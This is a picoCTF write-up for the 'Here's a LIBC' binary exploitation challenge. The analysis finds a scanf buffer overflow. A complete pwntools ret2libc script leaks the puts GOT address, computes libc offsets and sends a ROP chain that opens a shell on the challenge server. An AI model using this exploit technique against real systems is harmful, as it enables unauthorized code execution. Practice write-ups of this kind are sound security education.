---
slug: heres_a_libc
title: Here's a LIBC
authors: [nguyen]
tags: [Pico CTF, Binary Exploitation]
---

<!--truncate-->

## The Challenge

The challenge can be found [here](https://play.picoctf.org/practice).

## Analysis

I always like to start off with running checksec on the binary of interest.

```bash
checksec ./vuln
```

Insert image of checksec result here.

We won't be able to execute instructions on the stack so a ropchain may be necessary. PIE is not enabled so we will not need to worry about memory addresses changing every time we run the binary.

Using Ghidra, we find that there is a ```scanf``` vulnerability that can lead to a buffer overflow. We can use ```cyclic``` to determine the overflow offset which is 136.

## The Solve

There is no flag within the binary so we will try to obtain a shell. If we leak a libc address, we can find the base address of the library and then utilize the system function to start a shell.

A common technique here is to use ```puts``` to leak the ```puts``` GOT. With the ```puts``` address, we can determine the address for system and craft a ropchain to run ```system("bin/sh")```. Due to stack alignment, I needed an extra ```ret``` instruction.

Now we have a shell and can see that there is a flag file that we can ```cat```.

## Script

```python
from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

gdb_script = """
"""

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('mercury.picoctf.net', 24159)
    elif args.get('GDB'):
        io = gdb.debug([exe.path], gdb_script)
    else:
        io = process([exe.path])
    return io


def main():
    '''Return the flag.
    '''
    offset = 136

    rop = ROP(exe)
    with conn() as io:
        pattern = b"A" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \
                    p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.symbols['main'])
        io.sendline(pattern)
        io.recvlines(2)
        # Get the puts output of the puts GOT address
        got_addr = io.recvline()
        # Strip newline
        got_addr = got_addr[:-1]
        
        # Pad for packing
        pad_len = 8 - len(got_addr)
        got_addr = got_addr + (b"\x00" * pad_len)

        print(f"GOT ADDR: {hex(u64(got_addr))}")
        base_addr = u64(got_addr) - 0x180a30
        print(f"Base addr: {hex(base_addr)}")
        system_addr = base_addr + 0x0014f4e0
        print(f"System addr: {hex(system_addr)}")
        bin_sh_addr = base_addr + 0x2b40fa
        
        # Note stack alignment issues so additional ret was required for 16 byte alignment
        payload = b"A" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \
                    p64(bin_sh_addr) + p64(rop.find_gadget(['ret'])[0]) + \
                    p64(system_addr)
        io.sendline(payload)
        io.interactive()


if __name__ == '__main__':
    main()
```
